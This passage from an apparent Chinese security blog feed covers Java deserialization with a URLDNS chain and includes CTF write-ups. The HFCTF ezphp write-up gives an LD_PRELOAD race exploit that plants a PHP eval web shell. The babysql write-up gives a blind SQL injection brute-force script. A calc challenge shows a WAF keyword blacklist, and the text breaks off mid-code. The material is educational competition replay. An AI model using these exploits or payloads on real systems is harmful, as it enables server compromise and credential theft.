class="token punctuation">,</span>transformerdmap<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">serialize</span><span class="token punctuation">(</span>obj<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">deserialize</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span>        <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">serialize</span><span class="token punctuation">(</span>Object obj<span class="token punctuation">)</span> <span class="token keyword">throws</span> IOException<span class="token punctuation">,</span> ClassNotFoundException <span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>        FileOutputStream fos <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">FileOutputStream</span><span class="token punctuation">(</span><span class="token string">"aa.ser"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        ObjectOutputStream os<span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ObjectOutputStream</span><span class="token punctuation">(</span>fos<span class="token punctuation">)</span><span class="token punctuation">;</span>        os<span class="token punctuation">.</span><span class="token function">writeObject</span><span class="token punctuation">(</span>obj<span class="token punctuation">)</span><span class="token punctuation">;</span>        os<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        fos<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span>        <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">deserialize</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">throws</span> IOException<span class="token punctuation">,</span> ClassNotFoundException <span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>        FileInputStream fis <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">FileInputStream</span><span class="token punctuation">(</span><span class="token string">"aa.ser"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        ObjectInputStream is <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ObjectInputStream</span><span class="token punctuation">(</span>fis<span class="token punctuation">)</span><span class="token punctuation">;</span>        is<span class="token punctuation">.</span><span class="token function">readObject</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        is<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        fis<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span><span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span></code></pre><p>整个下来看不懂的话可以去看视频，up主讲的很好：<br><a href="https://www.bilibili.com/video/BV1no4y1U7E1/?spm_id_from=333.788">https://www.bilibili.com/video/BV1no4y1U7E1/?spm_id_from=333.788</a></p>]]></content>
      
      
      <categories>
          
          <category> Java </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 反序列化 </tag>
            
            <tag> Java </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>浅聊Java反序列化</title>
      <link href="/2022/04/06/qian-liao-java-fan-xu-lie-hua/"/>
      <url>/2022/04/06/qian-liao-java-fan-xu-lie-hua/</url>
      
        <content type="html"><![CDATA[<h2 id="浅聊Java反序列化"><a href="#浅聊Java反序列化" class="headerlink" title="浅聊Java反序列化"></a>浅聊Java反序列化</h2><p>论反序列化就离不开序列化，序列化是将一个类对象的状态信息转换为字节序列，以便传输和存储。而反序列化就是一个逆过程。</p><p>字节序：指多字节数据在计算机内存中存储或者网络传输时各字节的存储顺序。</p><p>序列化一个类对象需要继承<code>java.io.Serializable</code>接口，这个接口标识该类可以被序列化。</p><p>注意：</p><ul><li>静态属性的不能被序列化</li><li>声明<code>transient</code>可以不被序列化  public transient String name；</li></ul><h2 id="序列化ID"><a href="#序列化ID" class="headerlink" title="序列化ID"></a>序列化ID</h2><p>seriaVersionUID，序列化的一个版本标识，可用来保证在反序列时，发送方发送的和接受方接收的是可兼容的对象。如果接收方接收的类的 serialVersionUID 与发送方发送的 serialVersionUID 不一致，进行反序列时会抛出 InvalidClassException。</p><h2 id="序列化和反序列化的实现"><a href="#序列化和反序列化的实现" class="headerlink" title="序列化和反序列化的实现"></a>序列化和反序列化的实现</h2><pre class=" language-java"><code class="language-java"><span class="token keyword">class</span> <span class="token class-name">Person</span> <span class="token keyword">implements</span> <span class="token class-name">Serializable</span><span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>  <span class="token comment" spellcheck="true">// 被序列化的类</span>    <span class="token keyword">public</span> String name<span class="token punctuation">;</span>    <span class="token function">Person</span><span class="token punctuation">(</span>String name<span class="token punctuation">)</span><span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>name <span class="token operator">=</span> name<span class="token punctuation">;</span>    <span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span><span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">TestSerializable</span><span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span>String<span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> IOException<span class="token punctuation">,</span> ClassNotFoundException <span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>        Person a <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Person</span><span class="token punctuation">(</span><span class="token string">"lees"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">serialize</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment" spellcheck="true">// 序列化对象</span>    <span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">serialize</span><span class="token punctuation">(</span>Object obj<span class="token punctuation">)</span> <span class="token keyword">throws</span> IOException<span class="token punctuation">,</span> ClassNotFoundException <span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>        FileOutputStream fos <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">FileOutputStream</span><span class="token punctuation">(</span><span class="token string">"aa.ser"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token comment" spellcheck="true">// 新建一个文件流，一般默认将序列化后的字节序列保存为.ser</span>        ObjectOutputStream os<span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ObjectOutputStream</span><span class="token punctuation">(</span>fos<span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token comment" spellcheck="true">// 新建一个写入流</span>        os<span class="token punctuation">.</span><span class="token function">writeObject</span><span class="token punctuation">(</span>obj<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment" spellcheck="true">// 字节序列写入aa.ser</span>        os<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        fos<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">deserialize</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">throws</span> IOException<span class="token punctuation">,</span> ClassNotFoundException <span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>        FileInputStream fis <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">FileInputStream</span><span class="token punctuation">(</span><span class="token string">"aa.ser"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        ObjectInputStream is <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ObjectInputStream</span><span class="token punctuation">(</span>fis<span class="token punctuation">)</span><span class="token punctuation">;</span>        is<span class="token punctuation">.</span><span class="token function">readObject</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment" spellcheck="true">// 读取字节序列</span>        is<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        fis<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span><span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span></code></pre><h2 id="反序列化的漏洞产生"><a href="#反序列化的漏洞产生" class="headerlink" title="反序列化的漏洞产生"></a>反序列化的漏洞产生</h2><p>当开发人员编写的代码接受来自用户特意编造的序列化数据并尝试将其反序列化以在程序中使用时，就会出现漏洞。</p><p>Java是允许我们重写writeObject()和readObject()的。</p><p>漏洞产生可能的形式：</p><ul><li>入口类的readObject()直接调用危险方法</li><li>入口类包含可控类，该类有危险方法，readObject()时调用</li><li>入口类包含可控类，该类又调用其他有危险方法的类，readObject()时调用</li></ul><p>攻击条件：</p><ul><li><p>继承Serializable接口</p></li><li><p>入口类 source (重写readObject() 调用常见的函数 参数类型宽泛 最好jdk自带)</p></li><li><p>调用链 gadgetchain 相同名称 相同类型</p></li><li><p>执行类 sink (rce ssrf 写文件等)</p></li></ul><h2 id="简单的反序列化–URLDNS链"><a href="#简单的反序列化–URLDNS链" class="headerlink" title="简单的反序列化–URLDNS链"></a>简单的反序列化–URLDNS链</h2><p><a href="https://juejin.cn/post/6844903954774491144#heading-5">为什么HashMap要自己实现writeObject和readObject方法？</a></p><p>java.util.HashMap类中有一个readObject()方法</p><p>java.net.URLStreamHandler这个抽象类的hashCode调用了getHostAddress方法，getHostAddress()方法会进行DNS查询，参数可控</p><p>Java允许我们重写readObject和writeObject，重写的readObject()需要是private，才会进去重写的readObject()</p><h3 id="组合HashMap和URLStreamHandler"><a href="#组合HashMap和URLStreamHandler" class="headerlink" title="组合HashMap和URLStreamHandler"></a>组合HashMap和URLStreamHandler</h3><p>HashMap::readObject()–&gt;HashMap::hash()–&gt;URL::hashCode()–&gt;URLStreamHandler::hashCode()–&gt;URLStreamHandler::getHostAdderss()</p><p><img src="https://bu.dusays.com/2022/04/10/d8b91d5ac6360.png"></p><p><strong>利用代码：</strong></p><pre class=" language-java"><code class="language-java"><span class="token keyword">package</span> com<span class="token punctuation">.</span>demo<span class="token punctuation">.</span>Serializable<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>io<span class="token punctuation">.</span>*<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>reflect<span class="token punctuation">.</span>Field<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>net<span class="token punctuation">.</span>URL<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>util<span class="token punctuation">.</span>HashMap<span class="token punctuation">;</span><span class="token comment" spellcheck="true">/** * @data: 2022 * @author: Lees * @since: JDK 11 */</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">TestURLSerialize</span><span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span>String<span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> Exception <span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>        HashMap map <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">HashMap</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        URL url <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">URL</span><span class="token punctuation">(</span><span class="token string">"http://url"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        Field f <span class="token operator">=</span> Class<span class="token punctuation">.</span><span class="token function">forName</span><span class="token punctuation">(</span><span class="token string">"java.net.URL"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getDeclaredField</span><span class="token punctuation">(</span><span class="token string">"hashCode"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        map<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span>url<span class="token punctuation">,</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment" spellcheck="true">// put之后，hashCode为url的hash，不再是-1，所以要重新设置为-1，再进行序列化（-1的时候才会去计算hash，否则直接返回，也就不会去执行getHostAddress函数了）</span>        f<span class="token punctuation">.</span><span class="token function">setAccessible</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// 修改访问权限</span>        f<span class="token punctuation">.</span><span class="token function">set</span><span class="token punctuation">(</span>url<span class="token punctuation">,</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">serialize</span><span class="token punctuation">(</span>map<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">deserialize</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">serialize</span><span class="token punctuation">(</span>Object obj<span class="token punctuation">)</span> <span class="token keyword">throws</span> IOException<span class="token punctuation">,</span> ClassNotFoundException <span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>        FileOutputStream fos <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">FileOutputStream</span><span class="token punctuation">(</span><span class="token string">"aa.ser"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        ObjectOutputStream os<span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ObjectOutputStream</span><span class="token punctuation">(</span>fos<span class="token punctuation">)</span><span class="token punctuation">;</span>        os<span class="token punctuation">.</span><span class="token function">writeObject</span><span class="token punctuation">(</span>obj<span class="token punctuation">)</span><span class="token punctuation">;</span>        os<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        fos<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">deserialize</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">throws</span> IOException<span class="token punctuation">,</span> ClassNotFoundException <span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>        FileInputStream fis <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">FileInputStream</span><span class="token punctuation">(</span><span class="token string">"aa.ser"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        ObjectInputStream is <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ObjectInputStream</span><span class="token punctuation">(</span>fis<span class="token punctuation">)</span><span class="token punctuation">;</span>        is<span class="token punctuation">.</span><span class="token function">readObject</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        is<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        fis<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span><span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span></code></pre>]]></content>
      
      
      <categories>
          
          <category> Java </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 反序列化 </tag>
            
            <tag> Java </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>HFCTF&amp;HMGCTF赛题复现</title>
      <link href="/2022/03/24/hfctf-hmgctf/"/>
      <url>/2022/03/24/hfctf-hmgctf/</url>
      
        <content type="html"><![CDATA[<p>这周打了几个ctf比赛，赛中坐牢，赛后复现下了。</p><h1 id="HFCTF"><a href="#HFCTF" class="headerlink" title="HFCTF"></a>HFCTF</h1><h2 id="ezphp"><a href="#ezphp" class="headerlink" title="ezphp"></a>ezphp</h2><p><a href="https://github.com/waderwu/My-CTF-Challenges/tree/master/hfctf-2022/ezphp">题目打包源码</a></p><p><img src="https://bu.dusays.com/2022/03/24/e541ba9ca8ad4.png"></p><p>分析下题目，获取一个get参数env，然后设置一个环境变量。</p><p>那首先就是去想想环境变量怎么利用，如果这题有文件上传点，那可以很简单的利用<code>LD_PRELOAD</code>指向一个.so文件getshell，但这题没有上传点</p><p>p神发过一篇专讲环境变量注入执行命令的文章<a href="https://tttang.com/archive/1450/">https://tttang.com/archive/1450/</a> ，但分析的是centos系列的，而题目环境是debian的，只能从别的地方下手，再仔细看看，可以发现题目中间件用的是nginx</p><p><img src="https://bu.dusays.com/2022/03/27/598767da96e35.png"></p><p>当nginx接收到来自Fast CGI的响应时，如果大小超过缓冲区限定值（一般为32+4KB），会在<code>/var/lib/nginx/fastcgi</code>目录下产生一个临时文件存储部分响应内容，当处理完后会立即删除（unlink()）。文件创建到删除的窗口期不足以去加载一个文件。</p><p>nginx缓冲区的大小由 fastcgi_buffers 和 fastcgi_buffer_size 两个值控制。</p><pre class=" language-conf"><code class="language-conf">fastcgi_buffers      8 4K;  // 缓冲区大小，不包含后者fastcgi_buffer_size  4K;  // 处理Response的第一个缓冲区大小</code></pre><p>那还有别的思路吗？</p><p>当nginx打开一个文件时，会在<code>/proc/&lt;nginx PID&gt;/fd/</code>目录下创建一个文件描述符，即使文件被删除了，但没有关闭文件句柄则仍存在，可以进行读取</p><p><img src="https://bu.dusays.com/2022/03/28/d8a36a05b6042.png"></p><p><img src="https://bu.dusays.com/2022/03/28/19d8b9a65347f.png"></p><p>到这里，那最后的思路大概就是使nginx处理一个大的so文件，使nginx生成临时文件，然后利用LD_PROLOAD竞争包含临时文件</p><p>当nginx进程结束后，<code>/proc/&lt;nginx PID&gt;</code>目录也会消失，所以我们需要在so文件后面加一堆脏字符，使nginx进程存在的时间长一点，有时间来包含文件</p><p>具体利用代码：</p><pre class=" language-c"><code class="language-c"><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;unistd.h></span></span><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span><span class="token function">__attribute__</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>__constructor__<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token keyword">void</span> <span class="token function">angel</span> <span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span><span class="token function">unsetenv</span><span class="token punctuation">(</span><span class="token string">"LD_PRELOAD"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"echo \"&lt;?php eval(\\$_POST[cmd]);?>\" > /var/www/html/shell.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span> </code></pre><pre class=" language-shell"><code class="language-shell">gcc -fPIC -shared -o exp.sovar=`dd if=/dev/zero bs=1c count=500000 | tr '\0' 'c'`$var >> exp.so</code></pre><pre class=" language-python"><code class="language-python"><span class="token keyword">import</span> _thread<span class="token keyword">import</span> time<span class="token keyword">import</span> requestsaddr<span class="token operator">=</span><span class="token string">"http://37e4b6a1-a854-41df-b0f8-6b48e66973de.node4.buuoj.cn:81/"</span><span class="token keyword">def</span> <span class="token function">tr1</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>   <span class="token keyword">while</span> <span class="token number">1</span><span class="token punctuation">:</span>      files <span class="token operator">=</span> open<span class="token punctuation">(</span><span class="token string">"exp.so"</span><span class="token punctuation">,</span> <span class="token string">'rb'</span><span class="token punctuation">)</span>      url <span class="token operator">=</span> addr<span class="token operator">+</span><span class="token string">"/index.php"</span>      requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span> data<span class="token operator">=</span>files<span class="token punctuation">)</span>      time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">tr2</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">while</span> <span class="token number">1</span><span class="token punctuation">:</span>        <span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token keyword">for</span> j <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">:</span>                url <span class="token operator">=</span> <span class="token string">"/index.php?env=LD_PRELOAD=/proc/&amp;#123;&amp;#125;/fd/&amp;#123;&amp;#125;"</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>str<span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">,</span>str<span class="token punctuation">(</span>j<span class="token punctuation">)</span><span class="token punctuation">)</span>                response <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>addr<span class="token operator">+</span>url<span class="token punctuation">)</span>                <span class="token keyword">print</span><span class="token punctuation">(</span>str<span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">" Response body: %s"</span> <span class="token operator">%</span> response<span class="token punctuation">.</span>content<span class="token punctuation">)</span>            time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token keyword">try</span><span class="token punctuation">:</span>   _thread<span class="token punctuation">.</span>start_new_thread<span class="token punctuation">(</span> tr1<span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>   _thread<span class="token punctuation">.</span>start_new_thread<span class="token punctuation">(</span> tr2<span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">except</span><span class="token punctuation">:</span>   <span class="token keyword">print</span> <span class="token punctuation">(</span><span class="token string">"Error: 无法启动线程"</span><span class="token punctuation">)</span><span class="token keyword">while</span> <span class="token number">1</span><span class="token punctuation">:</span>   <span class="token keyword">pass</span></code></pre><p>参考文章：</p><p><a href="https://tttang.com/archive/1384/">https://tttang.com/archive/1384/</a></p><p><a href="https://bkfish.github.io/2022/03/20/2022%E8%99%8E%E7%AC%A6ezphp%E5%AE%8C%E6%95%B4%E8%BF%87%E7%A8%8B/">https://bkfish.github.io/2022/03/20/2022%E8%99%8E%E7%AC%A6ezphp%E5%AE%8C%E6%95%B4%E8%BF%87%E7%A8%8B/</a></p><h2 id="babysql"><a href="#babysql" class="headerlink" title="babysql"></a>babysql</h2><p>报错注入+盲注，绕过前端后，有两个正则过滤</p><p><img src="https://bu.dusays.com/2022/03/29/46177db59ca93.png"></p><p>经过测试，如果sql语句有错误返回状态码500，如果正常查询则返回401，那么可以构造一个会报错的语句，然后用regexp(也可以用rlike)来匹配username，password，如果匹配错误就执行报错的语句，根据这个判断去爆破</p><pre class=" language-text"><code class="language-text">'||case'0'when`password`collate'utf8mb4_bin'regexp'^&#123;&#125;'then~0+1||'1'end||'1'='2</code></pre><pre class=" language-sql"><code class="language-sql"><span class="token keyword">SELECT</span> <span class="token operator">*</span> <span class="token keyword">FROM</span> auth <span class="token keyword">WHERE</span> username<span class="token operator">=</span><span class="token string">''</span><span class="token operator">||</span><span class="token keyword">case</span><span class="token string">'0'</span><span class="token keyword">when</span><span class="token punctuation">`</span>password<span class="token punctuation">`</span><span class="token keyword">collate</span><span class="token string">'utf8mb4_bin'</span><span class="token operator">regexp</span>'<span class="token operator">^</span><span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#123;&amp;#125;'then~0+1||'1'end||'1'='2' LIMIT 1</span></code></pre><p>我们可以分析下这个payload，题目过滤了括号，不能使用函数了，只能构造逻辑语句</p><p>因为过滤了空格，所以需要占位符分隔（||、&amp;&amp;、’、”、&#96;），反引号是mysql的转义符，可以用来指定列名和字段名，也可以当作一种单引号。</p><p><code>case</code>语句是一个控制流语句，它有两种用法，举个例子吧</p><pre><code>case when result=&#39;win&#39; then 1 else 2 end// 如果result=&#39;win&#39;为否，则执行2，如果没有else，返回NULLcase result when &#39;win&#39; then 1 else 2 end// 在这题里过滤了=号，可以用第二种</code></pre><p>mysql中的regexp返回值为1或者0这就和前面case’0’对应上了，但sql两个字符串比较是不区分大小写的，除非其中一个操作数区分大小写（使用区分大小写的排序规则或二进制字符串）</p><p><img src="https://bu.dusays.com/2022/03/29/e524f5cb3782b.png"></p><p>utf8mb4：Unicode字符集的UTF-8编码</p><p>_utf8mb4和utf8mb4_0900_as_cs都可以起到类似的效果</p><p><code>~0+1</code>这串就是使sql报错的，取反得到最大值，+1超出范围报错</p><p>最后还有个||’1’&#x3D;’1就只是为了闭合引号，分析完了，剩下的就交给脚本了</p><pre class=" language-python"><code class="language-python"><span class="token keyword">import</span> requestspassword <span class="token operator">=</span> <span class="token string">""</span><span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token string">"abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"</span><span class="token punctuation">:</span>        req<span class="token operator">=</span>requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span><span class="token string">"http://47.107.231.226:29667/login"</span><span class="token punctuation">,</span> data<span class="token operator">=</span><span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#123;"password":"1", "username":"'||case'0'when`password`collate'utf8mb4_bin'regexp'^&amp;#123;&amp;#125;'then~0+1||'1'end||'1'='2".format(password+i)&amp;#125;)</span>        <span class="token keyword">if</span> <span class="token string">"401"</span> <span class="token keyword">in</span> req<span class="token punctuation">.</span>text<span class="token punctuation">:</span>            password<span class="token operator">+=</span>i            <span class="token keyword">print</span><span class="token punctuation">(</span>password<span class="token punctuation">)</span>            <span class="token keyword">break</span>            <span class="token comment" spellcheck="true"># 账号和密码的爆破字典不一样</span><span class="token comment" spellcheck="true"># user：abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789</span><span class="token comment" spellcheck="true"># passwd：abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@$^&amp;_+%</span></code></pre><h1 id="2022DASCTF三月赛"><a href="#2022DASCTF三月赛" class="headerlink" title="2022DASCTF三月赛"></a>2022DASCTF三月赛</h1><h2 id="calc"><a href="#calc" class="headerlink" title="calc"></a>calc</h2><p>题目源码：</p><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#coding=utf-8</span><span class="token keyword">from</span> flask <span class="token keyword">import</span> Flask<span class="token punctuation">,</span>render_template<span class="token punctuation">,</span>url_for<span class="token punctuation">,</span>render_template_string<span class="token punctuation">,</span>redirect<span class="token punctuation">,</span>request<span class="token punctuation">,</span>current_app<span class="token punctuation">,</span>session<span class="token punctuation">,</span>abort<span class="token punctuation">,</span>send_from_directory<span class="token keyword">import</span> random<span class="token keyword">from</span> urllib <span class="token keyword">import</span> parse<span class="token keyword">import</span> os<span class="token keyword">from</span> werkzeug<span class="token punctuation">.</span>utils <span class="token keyword">import</span> secure_filename<span class="token keyword">import</span> timeapp<span class="token operator">=</span>Flask<span class="token punctuation">(</span>__name__<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">waf</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">:</span>    blacklist <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'import'</span><span class="token punctuation">,</span><span class="token string">'('</span><span class="token punctuation">,</span><span class="token string">')'</span><span class="token punctuation">,</span><span class="token string">' '</span><span class="token punctuation">,</span><span class="token string">'_'</span><span class="token punctuation">,</span><span class="token string">'|'</span><span class="token punctuation">,</span><span class="token string">';'</span><span class="token punctuation">,</span><span class="token string">'"'</span><span class="token punctuation">,</span><span class="token string">'&amp;#123;'</span><span class="token punctuation">,</span><span class="token string">'&amp;#125;'</span><span class="token punctuation">,</span><span class="token string">'&amp;'</span><span class="token punctuation">,</span><span class="token string">'getattr'</span><span class="token punctuation">,</span><span class="token string">'os'</span><span class="token punctuation">,</span><span class="token string">'system'</span><span class="token punctuation">,</span><span class="token string">'class'</span><span class="token punctuation">,</span><span class="token string">'subclasses'</span><span class="token punctuation">,</span><span class="token string">'mro'</span><span class="token punctuation">,</span><span class="token string">'request'</span><span 